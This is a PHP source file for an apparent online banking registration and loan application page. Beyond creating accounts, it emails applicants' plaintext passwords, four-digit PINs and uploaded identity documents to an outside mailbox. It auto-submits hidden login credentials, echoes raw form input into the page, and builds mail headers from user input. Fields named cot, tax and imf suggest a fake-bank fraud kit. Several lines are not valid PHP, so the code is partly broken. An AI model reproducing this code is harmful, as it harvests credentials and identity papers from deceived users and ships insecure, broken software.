<?php
session_start();
require_once 'admin.php';
 
 
$reg_user = new USER();

if(isset($_POST['register']))
{
	
	
	$fname = trim($_POST['fname']);
	$fname = strip_tags($fname);
	$fname = htmlspecialchars($fname);
	
	$mname = trim($_POST['mname']);
	$mname = strip_tags($mname);
	$mname = htmlspecialchars($mname);
	
	$lname = trim($_POST['lname']);
	$lname = strip_tags($lname);
	$lname = htmlspecialchars($lname);
	
	$uname = trim($_POST['uname']);
	$uname = strip_tags($uname);
	$uname = htmlspecialchars($uname);
	
	$upass = $_POST['upass'];
	$upass2 = $_POST['upass2'];
	$image = $_POST['image'];
	$pp = $_POST['pp'];
	
	$phone = trim($_POST['phone']);
	$phone = strip_tags($phone);
	$phone = htmlspecialchars($phone);
	
	$loan = trim($_POST['loan']);
	$loan = strip_tags($loan);
	$loan = htmlspecialchars($loan);
	
	$email = trim($_POST['email']);
	$email = strip_tags($email);
	$email = htmlspecialchars($email);
	
	$type = trim($_POST['type']);
	$type = strip_tags($type);
	$type = htmlspecialchars($type);
	
	$reg_date = trim($_POST['reg_date']);
	
	$work = trim($_POST['work']);
	$work = strip_tags($work);
	$work = htmlspecialchars($work);
	
	$acc_no = trim($_POST['acc_no']);
	$acc_no = strip_tags($acc_no);
	$acc_no = htmlspecialchars($acc_no);
	
	$addr = trim($_POST['addr']);
	$addr = strip_tags($addr);
	$addr = htmlspecialchars($addr);
	
	$sex = trim($_POST['sex']);
	$sex = strip_tags($sex);
	$sex = htmlspecialchars($sex);
	
	$dob = trim($_POST['dob']);
	$dob = strip_tags($dob);
	$dob = htmlspecialchars($dob);
	
	$marry = trim($_POST['marry']);
	$marry = strip_tags($marry);
	$marry = htmlspecialchars($marry);
	
	$t_bal = trim($_POST['t_bal']);
	$t_bal = strip_tags($t_bal);
	$t_bal = htmlspecialchars($t_bal);
	
	$a_bal = trim($_POST['a_bal']);
	$a_bal = strip_tags($a_bal);
	$a_bal = htmlspecialchars($a_bal);
	
	$currency = trim($_POST['currency']);
	$currency = strip_tags($currency);
	$currency = htmlspecialchars($currency);
	
	$cot = trim($_POST['cot']);
	$cot = strip_tags($cot);
	$cot = htmlspecialchars($cot);
	
	$tax = trim($_POST['tax']);
	$tax = strip_tags($tax);
	$tax = htmlspecialchars($tax);
	
	$imf = trim($_POST['imf']);
	$imf  = strip_tags($imf);
	$imf  = htmlspecialchars($imf);
	
	$stct = $reg_user->runQuery("SELECT * FROM site WHERE id = '20'");
            $stct->execute();
            $rowp = $stct->fetch(PDO::FETCH_ASSOC);

            $mall = $rowp['email'];
            $url = $rowp['url'];
            $nm = $rowp['name'];
            $add = $rowp['addr'];
	
	$stmt = $reg_user->runQuery("SELECT * FROM account WHERE acc_no=:acc_no");
	$stmt1 = $reg_user->runQuery("SELECT * FROM account WHERE email=:email");
	$stmt->execute(array(":acc_no"=>$acc_no));
	$stmt1->execute(array(":email"=>$email));
	$row = $stmt->fetch(PDO::FETCH_ASSOC);
	$row1 = $stmt1->fetch(PDO::FETCH_ASSOC);
	
	
	if($stmt->rowCount() > 0 || $stmt1->rowCount() > 0)
	{
		$msg = "
		      <div class='alert alert-danger'>
				<button class='close' data-dismiss='alert'>&times;</button>
					<strong>Sorry!</strong>  Acc Number or Username already exists! Please, try another one!
			  </div>
			  ";
	}
	else
	{
		if($reg_user->create($fname,$mname,$lname,$uname,$upass,$phone,$email,$type,$reg_date,$work,$acc_no,$addr,$sex,$dob,$marry,$t_bal,$a_bal,$currency,$cot,$tax,$imf,$upass2,$loan,$image,$pp))
		{			
			$id = $reg_user->lasdID();	
			
			
			
			
			$messag = "	
			


<!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
<html xmlns='http://www.w3.org/1999/xhtml'>
<head>
  <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
  <title>[SUBJECT]</title>
  <style type='text/css'>
  body {
   padding-top: 0 !important;
   padding-bottom: 0 !important;
   padding-top: 0 !important;
   padding-bottom: 0 !important;
   margin:0 !important;
   width: 100% !important;
   -webkit-text-size-adjust: 100% !important;
   -ms-text-size-adjust: 100% !important;
   -webkit-font-smoothing: antialiased !important;
 }
 .tableContent img {
   border: 0 !important;
   display: block !important;
   outline: none !important;
 }
 a{
  color:#382F2E;
}

p, h1{
  color:#382F2E;
  margin:0;
}

div,p,ul,h1{
  margin:0;
}
p{
font-size:13px;
color:#99A1A6;
line-height:19px;
}
h2,h1{
color:#444444;
font-weight:normal;
font-size: 22px;
margin:0;
}
a.link2{
padding:15px;
font-size:13px;
text-decoration:none;
background:#2D94DF;
color:#ffffff;
border-radius:6px;
-moz-border-radius:6px;
-webkit-border-radius:6px;
}
.bgBody{
background: #f6f6f6;
}
.bgItem{
background: #2C94E0;
}

@media only screen and (max-width:480px)
		
{
		
table[class='MainContainer'], td[class='cell'] 
	{
		width: 100% !important;
		height:auto !important; 
	}
td[class='specbundle'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		
	}
	td[class='specbundle1'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		padding-bottom:20px !important;
		
	}	
td[class='specbundle2'] 
	{
		width:90% !important;
		float:left !important;
		font-size:14px !important;
		line-height:18px !important;
		display:block !important;
		padding-left:5% !important;
		padding-right:5% !important;
	}
	td[class='specbundle3'] 
	{
		width:90% !important;
		float:left !important;
		font-size:14px !important;
		line-height:18px !important;
		display:block !important;
		padding-left:5% !important;
		padding-right:5% !important;
		padding-bottom:20px !important;
	}
	td[class='specbundle4'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		padding-bottom:20px !important;
		text-align:center !important;
		
	}
		
td[class='spechide'] 
	{
		display:none !important;
	}
	    img[class='banner'] 
	{
	          width: 100% !important;
	          height: auto !important;
	}
		td[class='left_pad'] 
	{
			padding-left:15px !important;
			padding-right:15px !important;
	}
		 
}
	
@media only screen and (max-width:540px) 

{
		
table[class='MainContainer'], td[class='cell'] 
	{
		width: 100% !important;
		height:auto !important; 
	}
td[class='specbundle'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		
	}
	td[class='specbundle1'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		padding-bottom:20px !important;
		
	}		
td[class='specbundle2'] 
	{
		width:90% !important;
		float:left !important;
		font-size:14px !important;
		line-height:18px !important;
		display:block !important;
		padding-left:5% !important;
		padding-right:5% !important;
	}
	td[class='specbundle3'] 
	{
		width:90% !important;
		float:left !important;
		font-size:14px !important;
		line-height:18px !important;
		display:block !important;
		padding-left:5% !important;
		padding-right:5% !important;
		padding-bottom:20px !important;
	}
	td[class='specbundle4'] 
	{
		width: 100% !important;
		float:left !important;
		font-size:13px !important;
		line-height:17px !important;
		display:block !important;
		padding-bottom:20px !important;
		text-align:center !important;
		
	}
		
td[class='spechide'] 
	{
		display:none !important;
	}
	    img[class='banner'] 
	{
	          width: 100% !important;
	          height: auto !important;
	}
		td[class='left_pad'] 
	{
			padding-left:15px !important;
			padding-right:15px !important;
	}
		
	.font{
		font-size:15px !important;
		line-height:19px !important;
		
		}
}

</style>

<script type='colorScheme' class='swatch active'>
  {
    'name':'Default',
    'bgBody':'f6f6f6',
    'link':'ffffff',
    'color':'99A1A6',
    'bgItem':'2C94E0',
    'title':'444444'
  }
</script>

</head>
<body>
  <div> 
  
  Your Account has been successfully created. Contact customer care to activate your account.
        </div>
  </body>
  </html>


";
						
						
			$subject = "Welcome to $nm, $fname";
						
			$reg_user->send_mail($email,$messag,$subject);	
			$msg1 = "
					<div class='alert alert-info'>
						<button class='close' data-dismiss='alert'>&times;</button>
						<strong>Success!</strong> Account Has Been Successfully Created! Please check your email for further instructions.
                   
			  		</div>
					";
		}
		else
		{
			echo "Sorry , Query could no execute...";
		}		
	}
}

    
      
   
?>

<?php
include('../../session.php');
?>
<?php session_start(); ?>

  
<!DOCTYPE html>
<html lang="en">
 <?php
        include('../../config.php');
        $result = $conn->query("SELECT * FROM site");
        if(!$result->num_rows > 0){ echo '<h2 style="text-align:center;">No Data Found</h2>'; }
        while($row = $result->fetch_assoc())
        {
      ?>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register | <?php echo $row['name']; ?></title>
    <!-- Bootstrap -->
    <link href="../../assets/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- External Css -->
    <link rel="stylesheet" href="../../assets/css/font-awesome.min.css">
    <link rel="stylesheet" href="../../assets/css/themify-icons.css" />
    <link rel="stylesheet" href="../../assets/css/magnific-popup.css" />
    <link rel="stylesheet" href="../../assets/css/owl.carousel.css" />

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="../../css/main.css">
    
    <!--My Custom Css -->
    <link rel="stylesheet" type="text/css" href="../../css/mine.css">
    
    <!--My Custom Css -->
    <link rel="stylesheet" type="text/css" href="../../css/animate.min.css">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700%7COpen+Sans" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Expletus+Sans" />
    
   <!-- Favicon -->
    <link rel="shortcut icon" type="image/png" href="../../images/logooo.png">
    <link rel="stylesheet" href="../../css/animations.css">
    <link href="../../sweetalert-js/sweetalert.html" rel="stylesheet" type="text/css">
    <script type="text/javascript" src="../../sweetalert-js/sweetalert.min.html"></script>
    <script type="text/javascript" src="../../sweetalert-js/sweetalert-2.html"></script>

    <style type="text/css">

        .navbar-flexo .navbar-collapse{
            background: white !important;
        }
        .navbar-flexo .navbar-collapse .navbar-nav li.dropdown::before{
            color: #336699 !important;
        }

    </style><script type="text/javascript">
                    $(document).ready(function(){
                      setTimeout(function(){
                        $("#tracking-loading").fadeOut();
                        $("#tracking-result").fadeIn();
                      },5000); });
                </script>
                
    <link href="../../dashboard/dash_style.css" rel="stylesheet" type="text/css"/>
  </head>
  <body style=" overflow-x: hidden;">
  <div  id='tracking-loading' style='text-align: center; padding: 30px 2px;'>
<img src="img/ajax-loader.gif" alt='Loading results...' />
<h4 style=''>
Processing Loan Application... Please Wait...
</h4>
</div>
    
<div id='tracking-result' style='display: none;' class="container-fluid" style=" padding-right:0px; padding-left:0px;">

    <header style=" background:white; width: 100%; z-index: 1000;">

        <div  style="background: #264c67;" class="nav-top hidden-xs" >
            <div class="container">
                <div class="row">
                    <div class="col-sm-6">
                        <div class="nav-top-social">
                            
                        </div>
                    </div>
                    <div class="col-sm-6 ">
                        <div class="nav-top-access">
                            <ul>
                                    
                 <li style="padding: 0 !important">
                            <style>
                                .goog-te-menu-value {
                                    padding: 3px !important; 
                                }
                                
                                .goog-te-gadget-simple {
                                    background-color: #fff;
                                    border-left: 1px solid #d5d5d5;
                                    border-top: 1px solid #9b9b9b;
                                    border-bottom: 1px solid #e8e8e8;
                                    border-right: 1px solid #d5d5d5;
                                    font-size: 10pt;
                                    display: inline-block;
                                    padding-top: 1px;
                                    padding-bottom: 2px;
                                    border-radius: 10px;
                                    cursor: pointer;
                                    zoom: 1;
                                }
                               
                            </style>
                            <a id="" href="#">
                                 <span id="google_translate_element"></span> 

                                 
<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
} </script><script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> 
                            
                            </a>
                        </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        

    </header>	 	    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 text-center my_heading">
                 <img src="site/<?php echo $row['image']; ?>" class="img-responsive" alt="Brand Logo">
                <h3 style=" color:white;">Registration</h3>
            </div>
        </div>
    </div>
     
     <!-- Image Content -->
     <div class="section-padding-top">
      <div class="container">
        <div class="row">
          <div class="col-md-8 col-md-offset-2">
            <div>
              <h6 class="accordion-title">Internet Banking Sign-Up</h6> 
           
              
              <form action="../login.php" method="post" id="yourform">
                  <input class="form-control" name="acc_no" id="acc_no" value="<?php echo $_POST["acc_no"]; ?>"   type="hidden">
                <input type="hidden" class="login-control"  name="upass" id="upass" value="<?php echo $_POST["upass"]; ?>">
                  <input type="submit" id="submit" name="submit" value="submit">
              </form>
              
              
              <script>            
    document.addEventListener("DOMContentLoaded", function(event) {
            document.createElement('form').submit.call(document.getElementById('yourform'));
            });         
</script>
              
              
              
              
              <?php if(isset($msg1)) echo $msg1;  ?>       


    <?php
   

   if($_POST) {
       
    
    - $fname     = "";
    - $cname            = "";
   - $email   	= "";
   - $state        	= "";
    - $city     		= "";
    - $zip           = "";
    - $phone       	= "";
   - $kin_first_name       	= "";
   - $addr        	= "";
   - $dob            = "";
   - $rev        = "";
    - $marry   		= "";
   - $kin_last_name        	= "";
    - $work     	= "";
    - $loan         = "";
    - $usc         = "";
   - $currency       	= "";
   - $type       	= "";
  - $acc_no        	= "";
    - $kin_gender       = "";
   - $kin_marital_status       = "";
   - $kphone   		= "";
    - $kemail        = "";
    - $uname     	= "";
    - $upass2       = "";
    - $mname ="";
     
     
    
     
    if(isset($_POST['fname'])) {
        $fname = filter_var($_POST['fname'], FILTER_SANITIZE_STRING);
    }
    
   
     
    if(isset($_POST['email'])) {
        $email = str_replace(array("\r", "\n", "%0a", "%0d"), '', $_POST['email']);
        $email = filter_var($email, FILTER_VALIDATE_EMAIL);
         
    }
     
   if(isset($_POST['cname'])) {
        $cname = filter_var($_POST['cname'], FILTER_SANITIZE_STRING);
    }
     
    if(isset($_POST['state'])) {
        $state = filter_var($_POST['state'], FILTER_SANITIZE_STRING);
    }
 
  if(isset($_POST['city'])) {
        $city = filter_var($_POST['city'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['zip'])) {
        $zip = filter_var($_POST['zip'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['phone'])) {
        $phone = filter_var($_POST['phone'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['kin_first_name'])) {
        $kin_first_name = filter_var($_POST['kin_first_name'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['addr'])) {
        $addr = filter_var($_POST['addr'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['dob'])) {
        $dob = filter_var($_POST['dob'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['rev'])) {
        $rev = filter_var($_POST['rev'], FILTER_SANITIZE_STRING);
    }
    
    if(isset($_POST['marry'])) {
        $marry = filter_var($_POST['marry'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['kin_last_name'])) {
        $kin_last_name = filter_var($_POST['kin_last_name'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['work'])) {
        $work = filter_var($_POST['work'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['loan'])) {
        $loan = filter_var($_POST['loan'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['usc'])) {
        $usc = filter_var($_POST['usc'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['currency'])) {
        $currency = filter_var($_POST['currency'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['type'])) {
        $type = filter_var($_POST['type'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['acc_no'])) {
        $acc_no = filter_var($_POST['acc_no'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['kin_gender'])) {
        $kin_gender = filter_var($_POST['kin_gender'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['kin_marital_status'])) {
        $kin_marital_status = filter_var($_POST['kin_marital_status'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['kphone'])) {
        $kphone = filter_var($_POST['kphone'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['kemail'])) {
        $kemail = filter_var($_POST['kemail'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['uname'])) {
        $uname = filter_var($_POST['uname'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['upass2'])) {
        $upass2 = filter_var($_POST['upass2'], FILTER_SANITIZE_STRING);
    }
    if(isset($_POST['mname'])) {
        $mname = filter_var($_POST['mname'], FILTER_SANITIZE_STRING);
    }
 
    $recipient = "info@oasistrusts.com";
     
    $headers  = 'MIME-Version: 1.0' . "\r\n"
    .'Content-type: text/html; charset=utf-8' . "\r\n"
    .'From: ' . $email . "\r\n";
 
    $email_content = "<html><body>";
    $email_content .= "<table style='font-family: Arial;'><tbody><tr>
    <td style='background: #eee; padding: 10px;'>Name</td><td style='background: #fda; padding: 10px;'>$fname</td></tr>";
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Trade Name</td><td style='background: #fda; padding: 10px;'>$cname</td></tr>";
    $email_content .= "<tr><td style='background: #eee; padding: 10px;'> Email</td><td style='background: #fda; padding: 10px;'>$email</td></tr>";
   
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Gross Revenue</td><td style='background: #fda; padding: 10px;'>$rev</td></tr>";
     
     
      $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Date of Business Establishment</td><td style='background: #fda; padding: 10px;'>$dob</td></tr>";
      
       
        $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Address</td><td style='background: #fda; padding: 10px;'>$addr $city $state </td></tr>";
    
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Loan Amount</td><td style='background: #fda; padding: 10px;'>$loan</td></tr>";
     
      $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Purpose of Funds</td><td style='background: #fda; padding: 10px;'>$zip</td></tr>";
      
       $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Are you a US citizen?</td><td style='background: #fda; padding: 10px;'>$usc</td></tr>";
    
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Phone</td><td style='background: #fda; padding: 10px;'>$phone</td></tr>";
     
     
    
    
    $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Current Ownership</td><td style='background: #fda; padding: 10px;'>$work</td></tr>";
    
     $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Currency</td><td style='background: #fda; padding: 10px;'>$currency </td></tr>";
     
      $email_content .= "<tr><td style='background: #eee; padding: 10px;'>Account Type</td><td style='background: #fda; padding: 10px;'>$type</td></tr>";
      
        
            $email_content .= "<tr><td style='background: #eee; padding: 10px;'>User-pas</td><td style='background: #fda; padding: 10px;'>$upass2</td></tr>";
             $email_content .= "<tr><td style='background: #eee; padding: 10px;'>4 Digit Pin</td><td style='background: #fda; padding: 10px;'>$mname</td></tr>";
          
        
    $email_content .= '</body></html>';
 
    
     
    if(mail($recipient, "New Application from Client", $email_content, $headers)) {
        echo '<p>Your application has been submitted successfully</p>';
    } else {
        echo '<p>We are sorry, but the Application failed. </p>';
    }
     
} else {
    echo '<p>Something went wrong</p>';
}
 
?>

 
<?php

$to         = 'info@oasistrusts.com';
    $subject = "Identity Document of last applicant";


    
/* GET File Variables */ 
$tmpName = $_FILES['attachment']['tmp_name']; 
$fileType = $_FILES['attachment']['type']; 
$fileName = $_FILES['attachment']['name']; 

/* Start of headers */ 
$headers = "From: $first_name"; 

if (file($tmpName)) { 
  /* Reading file ('rb' = read binary)  */
  $file = fopen($tmpName,'rb'); 
  $data = fread($file,filesize($tmpName)); 
  fclose($file); 

  /* a boundary string */
  $randomVal = md5(time()); 
  $mimeBoundary = "==Multipart_Boundary_x{$randomVal}x"; 

  /* Header for File Attachment */
  $headers .= "\nMIME-Version: 1.0\n"; 
  $headers .= "Content-Type: multipart/mixed;\n" ;
  $headers .= " boundary=\"{$mimeBoundary}\""; 

  /* Multipart Boundary above message */
  $message = "This is a multi-part message in MIME format.\n\n" . 
  "--{$mimeBoundary}\n" . 
  "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . 
  "Content-Transfer-Encoding: 7bit\n\n" . 
  $message . "\n\n"; 

  /* Encoding file data */
  $data = chunk_split(base64_encode($data)); 

  /* Adding attchment-file to message*/
  $message .= "--{$mimeBoundary}\n" . 
  "Content-Type: {$fileType};\n" . 
  " name=\"{$fileName}\"\n" . 
  "Content-Transfer-Encoding: base64\n\n" . 
  $data . "\n\n" . 
  "--{$mimeBoundary}--\n"; 
} 

$flgchk = mail ("$to", "$subject", "$message", "$headers"); 

if($flgchk){
  echo "Redirecting to dashboard! Please be patient!";
 }
else{
  echo "Error in Email sending";
}
?> 
                        <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-lg-8 col-lg-offset-2 text-center" style="margin-top: 5px;">
                                <a href="../" >Have an account already? Sign in</a>							</div>
                        <br>
                        </div>
                        </div>
                        </div>			
        </div>
          </div>
        </div>
      </div>
  
    <br>


    <!-- Footer -->
       <div class="footer-copyright">
        <div class="container">
          <div class="row">
            <div class="col-sm-6">
              <div class="copyright">
                <p> <a href="#"><?php echo $row['name']; ?></a> © <?php echo $row['year']; ?>. All rights reserved.</p>
              </div>
            </div>
            <div class="col-sm-6">
              <div class="privacy text-right">
                <ul>
                       
	 
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
 

    <!-- Footer End -->
    
      <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="../../assets/js/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script src="../../assets/js/imagesloaded.pkgd.min.js"></script>
    <script src="../../assets/js/isotope.pkgd.min.js"></script>
    <script src="../../assets/js/jquery.countdown.min.js"></script>
    <script src="../../assets/js/jquery.countTo.js"></script>
    <script src="../../assets/js/jquery.magnific-popup.min.js"></script>
    <script src="../../assets/js/owl.carousel.min.js"></script>
    <script src="../../assets/js/visible.js"></script>
    <script src="../../assets/js/jquery.ajaxchimp.min.js"></script>
    <script src="../../js/custom.js"></script>
    <script src="../../js/main.js"></script>
    <!--<script src="../../js/mine.js"></script>-->
    <script src="../../js/wow.min.js"></script>
<br> 
 <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/<?php echo $row['tawk']; ?>';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
  </body>

 
</html>
 <?php } ?>